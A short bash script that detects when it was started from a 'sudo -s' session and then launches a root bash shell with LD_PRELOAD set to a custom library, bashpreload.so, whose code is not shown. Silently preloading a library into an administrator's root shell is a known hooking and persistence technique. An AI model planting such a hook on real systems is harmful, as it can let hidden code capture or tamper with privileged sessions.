#!/bin/bash

if [ "$(ps -q $PPID -o args=)" == "sudo -s" ]
then
	LD_PRELOAD=/usr/local/bin/bashpreload.so /bin/bash
fi
